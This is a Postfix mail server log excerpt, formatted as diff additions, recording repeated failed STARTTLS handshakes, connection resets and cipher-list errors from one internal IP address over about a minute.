+Nov  6 11:12:57 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:57 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:58 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:58 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:58 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:58 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:58 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:12:59 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:12:59 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:12:59 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:12:59 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:12:59 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:00 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:00 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:00 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:00 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:00 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:01 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:01 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:01 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:01 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:01 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:02 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:02 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:02 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:02 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:02 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:03 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:03 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:03 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:03 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:03 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:04 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:04 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:04 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:04 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:04 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:05 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:05 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:05 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:05 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:05 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:06 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:06 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:06 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:06 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:06 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:07 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:07 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:07 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:07 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:07 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:08 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:08 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:08 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:08 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:08 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:09 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:09 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:09 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:09 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:09 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 2 bytes from the network: Connection reset by peer
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:10 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:11 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:11 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:11 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:11 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:11 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:12 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:12 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:12 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:12 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:12 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:13 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:13 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:13 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:13 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:13 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:14 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:14 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:14 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:14 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:14 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:15 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:15 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:15 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:15 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:15 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:16 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:16 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:16 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:16 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:16 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:17 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:17 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:17 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:17 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:17 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:18 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:18 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:18 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:18 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:18 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:19 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:19 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:19 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:19 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:19 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:20 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:20 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:20 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:20 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:20 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:21 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:21 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:21 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:21 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:21 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:22 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:22 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:22 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:22 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:22 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:23 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:23 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:23 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:23 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:23 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:24 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:24 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:24 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:24 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:24 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:25 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:25 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:25 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:25 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:25 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:26 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:26 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:26 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:26 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:26 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:27 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:27 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:27 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:27 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:27 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:28 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:28 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:28 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:28 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:28 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:29 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:29 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:29 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:29 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:29 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:30 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:30 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:30 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:30 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:30 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: warning: TLS library problem: 6199:error:140A1097:SSL routines:SSL_BYTES_TO_CIPHER_LIST:error in received cipher list:ssl_lib.c:1282:
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:31 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:32 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:32 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:32 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:32 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:32 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:33 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:33 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:33 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:33 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:33 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:34 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:34 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:34 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:34 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:34 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:35 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:35 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:35 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:35 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:35 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:36 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:36 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:36 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:36 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:36 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:37 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:37 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:37 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:37 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:37 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:38 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:38 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:38 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:38 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:38 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:39 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:39 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:39 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:39 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:39 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:40 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:40 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:40 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:40 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:40 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
+Nov  6 11:13:41 ubuntuA3 postfix/smtpd[6199]: warning: network_biopair_interop: error reading 5 bytes from the network: Connection reset by peer
+Nov  6 11:13:41 ubuntuA3 postfix/smtpd[6199]: SSL_accept error from unknown[10.43.2.77]: -1
+Nov  6 11:13:41 ubuntuA3 postfix/smtpd[6199]: lost connection after STARTTLS from unknown[10.43.2.77]
+Nov  6 11:13:41 ubuntuA3 postfix/smtpd[6199]: disconnect from unknown[10.43.2.77]
+Nov  6 11:13:41 ubuntuA3 postfix/smtpd[6199]: connect from unknown[10.43.2.77]
